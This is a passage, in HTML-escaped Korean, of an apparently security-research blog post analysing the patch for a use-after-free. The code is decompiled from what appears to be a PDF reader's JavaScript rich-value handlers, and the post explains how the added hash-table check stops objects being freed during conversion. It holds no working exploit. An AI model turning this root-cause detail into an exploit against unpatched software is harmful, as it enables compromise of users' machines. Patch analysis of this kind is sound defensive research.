&lt;p&gt;&lt;code&gt;GlobalHashTable&lt;/code&gt;&amp;#xACFC; &lt;code&gt;pData&lt;/code&gt;&amp;#xB97C; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &lt;code&gt;DeleteFromHashTable&lt;/code&gt;&amp;#xC744; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;h3 id=&#34;DeleteFromHashTable&#34;&gt;&lt;a href=&#34;#DeleteFromHashTable&#34; class=&#34;headerlink&#34; title=&#34;DeleteFromHashTable&#34;&gt;&lt;/a&gt;DeleteFromHashTable&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __thiscall &lt;span class=&#34;hljs-title&#34;&gt;DeleteFromHashTable&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(HashTable *hashTable, _DWORD *pData)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; DataHash; &lt;span class=&#34;hljs-comment&#34;&gt;// ebx&lt;/span&gt;
  HashBucketEntry *v4; &lt;span class=&#34;hljs-comment&#34;&gt;// edi&lt;/span&gt;
  ListEntry result; &lt;span class=&#34;hljs-comment&#34;&gt;// [esp+Ch] [ebp-8h] BYREF&lt;/span&gt;

  DataHash = hashFunction(&lt;span class=&#34;hljs-number&#34;&gt;0x811C9DC5&lt;/span&gt;, pData, &lt;span class=&#34;hljs-number&#34;&gt;4u&lt;/span&gt;);
  v4 = FindDataFromHashTable(hashTable, &amp;amp;result, pData, DataHash)-&amp;gt;Blink;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v4 )
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;                                   &lt;span class=&#34;hljs-comment&#34;&gt;// Not Found, No deletion&lt;/span&gt;
  UnlinkTargetFromBucketEntryHeader(hashTable, v4, DataHash &amp;amp; hashTable-&amp;gt;HashBuckets.BucketMaxIndex);
  UnlinkSelf((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)&amp;amp;hashTable-&amp;gt;DefaultHead, v4);
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;DeleteFromHashTable&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;hashFunction&lt;/code&gt;&amp;#xACFC; &lt;code&gt;FindDataFromHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0;&amp;#xC11C; &amp;#xC81C;&amp;#xAC70;&amp;#xD558;&amp;#xACE0;&amp;#xC790; &amp;#xD558;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294;&amp;#xB2E4;&amp;#xBA74; &amp;#xB2E4;&amp;#xB978; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xC218;&amp;#xD589;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xACE0; &amp;#xBC18;&amp;#xD658;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC81C;&amp;#xAC70;&amp;#xD560; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD55C;&amp;#xB2E4;&amp;#xBA74; &amp;#xBA3C;&amp;#xC800; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;UnlinkTargetFromBucketEntryHeader&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;UnlinkTargetFromBucketEntryHeader&#34;&gt;&lt;a href=&#34;#UnlinkTargetFromBucketEntryHeader&#34; class=&#34;headerlink&#34; title=&#34;UnlinkTargetFromBucketEntryHeader&#34;&gt;&lt;/a&gt;UnlinkTargetFromBucketEntryHeader&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;HashBucketEntry *__thiscall &lt;span class=&#34;hljs-title&#34;&gt;UnlinkTargetFromBucketEntryHeader&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(HashTable *hashTable, HashBucketEntry *target, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; Idx)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  HashBucketEntryHeader *v3; &lt;span class=&#34;hljs-comment&#34;&gt;// edx&lt;/span&gt;
  HashBucketEntry *result; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;

  v3 = hashTable-&amp;gt;HashBuckets.HashBucketBegin;
  result = target;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v3[Idx].BucketTail == target )           
  {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v3[Idx].BucketHead == target )        
    {
      result = hashTable-&amp;gt;DefaultHead;
      v3[Idx].BucketHead = result;
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
      result = target-&amp;gt;list_entry.list_entry.Blink;
    }
    v3[Idx].BucketTail = result;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v3[Idx].BucketHead == target )
  {
    result = target-&amp;gt;list_entry.list_entry.Flink;
    v3[Idx].BucketHead = target-&amp;gt;list_entry.list_entry.Flink;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;BucketHead&lt;/code&gt;&amp;#xC640; &lt;code&gt;BucketTail&lt;/code&gt;&amp;#xAC00; &amp;#xC81C;&amp;#xAC70;&amp;#xD558;&amp;#xACE0;&amp;#xC790; &amp;#xD558;&amp;#xB294; &amp;#xB178;&amp;#xB4DC;&amp;#xC778; &lt;code&gt;target&lt;/code&gt;&amp;#xACFC; &amp;#xAC19;&amp;#xC740;&amp;#xC9C0; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xC5EC; Head&amp;#xB098; Tail &amp;#xD639;&amp;#xC740; &amp;#xC591;&amp;#xCABD; &amp;#xBAA8;&amp;#xB450;&amp;#xB97C; &amp;#xAC31;&amp;#xC2E0;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;target&lt;/code&gt;&amp;#xC774; &lt;code&gt;BucketHead&lt;/code&gt;&amp;#xC778; &amp;#xACBD;&amp;#xC6B0;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;target-&amp;gt;Flink&lt;/code&gt;&amp;#xB97C; &amp;#xC0C8;&amp;#xB85C;&amp;#xC6B4; Head&amp;#xB85C; &amp;#xAC31;&amp;#xC2E0;&amp;#xD558;&amp;#xACE0; &lt;code&gt;BucketTail&lt;/code&gt;&amp;#xC778; &amp;#xACBD;&amp;#xC6B0;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;target-&amp;gt;Blink&lt;/code&gt;&amp;#xB97C; &amp;#xC0C8;&amp;#xB85C;&amp;#xC6B4; Tail&amp;#xB85C; &amp;#xAC31;&amp;#xC2E0;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;target&lt;/code&gt;&amp;#xC774; &amp;#xBC84;&amp;#xD0B7;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xC720;&amp;#xC77C;&amp;#xD55C; &amp;#xB178;&amp;#xB4DC;&amp;#xB77C;&amp;#xBA74; &lt;code&gt;BucketHead&lt;/code&gt;&amp;#xC640; &lt;code&gt;BucketTail&lt;/code&gt;&amp;#xC744; &amp;#xBAA8;&amp;#xB450; &lt;code&gt;hashTable-&amp;gt;DefaultHead&lt;/code&gt;&amp;#xB85C; &amp;#xBCC0;&amp;#xACBD;&amp;#xD558;&amp;#xC5EC; &amp;#xBC84;&amp;#xD0B7;&amp;#xC774; &amp;#xBE44;&amp;#xC5C8;&amp;#xC74C;&amp;#xC744; &amp;#xB098;&amp;#xD0C0;&amp;#xB0C5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;DeleteFromHashTable&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xBC18;&amp;#xD658;&amp;#xD55C; &amp;#xB2E4;&amp;#xC74C; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xAC83;&amp;#xC740; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;UnlinkSelf&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;h3 id=&#34;UnlinkSelf&#34;&gt;&lt;a href=&#34;#UnlinkSelf&#34; class=&#34;headerlink&#34; title=&#34;UnlinkSelf&#34;&gt;&lt;/a&gt;UnlinkSelf&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __thiscall &lt;span class=&#34;hljs-title&#34;&gt;UnlinkSelf&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *a1, HashBucketEntry *target)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  HashBucketEntry *v2; &lt;span class=&#34;hljs-comment&#34;&gt;// esi&lt;/span&gt;

  v2 = target-&amp;gt;list_entry.list_entry.Flink;
  --a1[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;];                                      &lt;span class=&#34;hljs-comment&#34;&gt;// decrease length&lt;/span&gt;
  target-&amp;gt;list_entry.list_entry.Blink-&amp;gt;list_entry.list_entry.Flink = v2;&lt;span class=&#34;hljs-comment&#34;&gt;// Unlink&lt;/span&gt;
  v2-&amp;gt;list_entry.list_entry.Blink = target-&amp;gt;list_entry.list_entry.Blink;
  sub_20867B89(target);                         &lt;span class=&#34;hljs-comment&#34;&gt;// free&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v2;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790; &lt;code&gt;a1&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xB41C; &lt;code&gt;GlobalHashTable.DefaultHead&lt;/code&gt;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; 4&amp;#xB97C; &amp;#xB354;&amp;#xD55C; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &lt;code&gt;length&lt;/code&gt;&amp;#xB97C; 1 &amp;#xAC10;&amp;#xC18C;&amp;#xC2DC;&amp;#xD0A4;&amp;#xACE0; &amp;#xC81C;&amp;#xAC70;&amp;#xD558;&amp;#xACE0;&amp;#xC790; &amp;#xD558;&amp;#xB294; &amp;#xB178;&amp;#xB4DC;&amp;#xC778; &lt;code&gt;target&lt;/code&gt;&amp;#xC744; &amp;#xC5F0;&amp;#xACB0; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xC81C;&amp;#xAC70;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &lt;code&gt;sub_20867B89&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;target&lt;/code&gt;&amp;#xC774; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC758; &amp;#xD574;&amp;#xC81C;&amp;#xAC00; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;Patched-SetRichValueEventProp-amp-GetRichValueEventProp&#34;&gt;&lt;a href=&#34;#Patched-SetRichValueEventProp-amp-GetRichValueEventProp&#34; class=&#34;headerlink&#34; title=&#34;Patched : SetRichValueEventProp &amp;amp; GetRichValueEventProp&#34;&gt;&lt;/a&gt;Patched : SetRichValueEventProp &amp;amp; GetRichValueEventProp&lt;/h2&gt;&lt;p&gt;&lt;code&gt;IsDataInGlobalHashTable&lt;/code&gt;, &lt;code&gt;InsertToGlobalHashTable&lt;/code&gt;, &lt;code&gt;DeleteFromGlobalHashTable&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xD638;&amp;#xCD9C;&amp;#xC740; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;SetRichValueEventProp&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xB3C4; &lt;code&gt;GetRichValueEventProp&lt;/code&gt;&amp;#xACFC; &amp;#xC720;&amp;#xC0AC;&amp;#xD55C; &amp;#xBC29;&amp;#xC2DD;&amp;#xC73C;&amp;#xB85C; &amp;#xCD94;&amp;#xAC00;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xC774;&amp;#xC81C; &amp;#xC774;&amp;#xB7EC;&amp;#xD55C; &amp;#xCF54;&amp;#xB4DC;&amp;#xB4E4;&amp;#xC774; &amp;#xCD94;&amp;#xAC00;&amp;#xB428;&amp;#xC73C;&amp;#xB85C;&amp;#xC368; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xAC8C; &amp;#xB418;&amp;#xB294;&amp;#xC9C0; &amp;#xC54C;&amp;#xC544;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;hljs-title&#34;&gt;SetRichValueEventProp&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *a1, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a2, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a3)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  ...
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v7() )
  {
    ...
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v8() )
    {
      ...
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (_WORD)v34 == v16()
        || (v29 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,
            v28 = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;bWillCommit&amp;quot;&lt;/span&gt;,
            v27 = v4,
            v17 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; (**)(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt;))(dword_2147CFA0 + &lt;span class=&#34;hljs-number&#34;&gt;196&lt;/span&gt;),
            __guard_check_icall_fptr(v4, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;bWillCommit&amp;quot;&lt;/span&gt;),
            v18 = v17(),
            (_WORD)v18) )
      {
LABEL_12:
        v29 = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CAgg_P&amp;quot;&lt;/span&gt;;
        v18 = sub_20A4BC05(v4, (&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *)&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;richValue&amp;quot;&lt;/span&gt;);
        PointerType = (_DWORD *)v18;
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v18 )
        {
          LOBYTE(v18) = IsDataInGlobalHashTable(v18);
          &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !(_BYTE)v18 )                    &lt;span class=&#34;hljs-comment&#34;&gt;// Not in process&lt;/span&gt;
          {
            v21 = InsertToGlobalHashTable((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;PointerTypePtr, (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)PointerType);
            LOBYTE(v36) = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
            CAgg::Convert((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v21, v22, PointerType, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
            sub_20AD749C((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)PointerType, v33, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;span class=&#34;hljs-comment&#34;&gt;// GetRichValueEventProp called&lt;/span&gt;
            v23 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; (**)(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt;))(dword_2147CFA0 + &lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt;);
            v29 = (&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *)&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
            __guard_check_icall_fptr(v4, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;bModified&amp;quot;&lt;/span&gt;);
            v23();
            v18 = DeleteFromGlobalHashTable((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;PointerTypePtr);
          }
        }
      }
      sub_20AAE6F7(v18, v19, v35);
    }
    result = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xBC84;&amp;#xC804;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC84;&amp;#xADF8;&amp;#xAC00; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xB418;&amp;#xB294; &amp;#xACFC;&amp;#xC815;&amp;#xC774; &amp;#xD328;&amp;#xCE58;&amp;#xB41C; &amp;#xBC84;&amp;#xC804;&amp;#xC5D0; &amp;#xB3D9;&amp;#xC77C;&amp;#xD558;&amp;#xAC8C; &amp;#xC801;&amp;#xC6A9;&amp;#xB420; &amp;#xACBD;&amp;#xC6B0;, &amp;#xBA3C;&amp;#xC800; &lt;code&gt;SetRichValueEventProp&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;IsDataInGlobalHashTable&lt;/code&gt;&amp;#xC758; &amp;#xBC18;&amp;#xD658; &amp;#xAC12;&amp;#xC774; 0&amp;#xC778; &amp;#xACBD;&amp;#xC6B0; &lt;code&gt;InsertToGlobalHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC5B4; &lt;code&gt;PointerType&lt;/code&gt;&amp;#xC774; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0; &amp;#xCD94;&amp;#xAC00;&amp;#xB420; &amp;#xAC83;&amp;#xC774;&amp;#xACE0; &amp;#xC774;&amp;#xD6C4; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &lt;code&gt;sub_20AD749C&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB85C; &amp;#xC778;&amp;#xD574; &lt;code&gt;GetRichValueEventProp&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xACE0; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xBA74;&amp;#xC11C; &lt;code&gt;IsDataInGlobalHashTable&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;hljs-title&#34;&gt;GetRichValueEventProp&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *a1, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a2, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a3)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  ...
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v5() )
  {
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    ...
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v31
      &amp;amp;&amp;amp; (v23 = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;richValue&amp;quot;&lt;/span&gt;,
          v22 = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v31,
          v11 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 (__fastcall **)(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;))(dword_2147CFA0 + &lt;span class=&#34;hljs-number&#34;&gt;180&lt;/span&gt;),
          v12 = __guard_check_icall_fptr(v31, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;richValue&amp;quot;&lt;/span&gt;),
          v11(v12)) )
    {
      v23 = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CAgg_P&amp;quot;&lt;/span&gt;;
      PointerType = sub_20A4BC05(v31, (&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *)&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;richValue&amp;quot;&lt;/span&gt;);
      PointerType_1 = PointerType;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( PointerType )
      {
        LOBYTE(PointerType) = IsDataInGlobalHashTable(PointerType);
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !(_BYTE)PointerType )
        {
          v15 = InsertToGlobalHashTable((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;v31, PointerType_1);
          LOBYTE(v33) = &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
          CAggToESVal((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v15, v16, PropName, PointerType_1);
          PointerType = DeleteFromGlobalHashTable((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;v31);
        }
      }
    }
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xBC84;&amp;#xC804;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC544;&amp;#xBB34;&amp;#xB7F0; &amp;#xAC80;&amp;#xC99D; &amp;#xC5C6;&amp;#xC774; &lt;code&gt;CAggToESVal&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC5B4; &amp;#xC5F4;&amp;#xAC70; &amp;#xB3C4;&amp;#xC911;&amp;#xC5D0; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xB4E4;&amp;#xC774; &amp;#xD574;&amp;#xC81C;&amp;#xB418;&amp;#xACE0; &amp;#xC774;&amp;#xD6C4; Use-After-Free&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xAC8C; &amp;#xB418;&amp;#xC9C0;&amp;#xB9CC; &amp;#xD328;&amp;#xCE58;&amp;#xB41C; &amp;#xBC84;&amp;#xC804;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;CAggToESVal&lt;/code&gt;&amp;#xC744; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xAE30; &amp;#xC804;&amp;#xC5D0; &lt;code&gt;IsDataInGlobalHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB54C;&amp;#xC758; &lt;code&gt;PointerType&lt;/code&gt;&amp;#xC740; &lt;code&gt;SetRichValueEventProp&lt;/code&gt;&amp;#xC758; &lt;code&gt;PointerType&lt;/code&gt;&amp;#xACFC; &amp;#xAC19;&amp;#xACE0; &lt;code&gt;SetRichValueEventProp&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;InsertToGlobalHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &amp;#xC774;&amp;#xBBF8; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xC0C1;&amp;#xD0DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
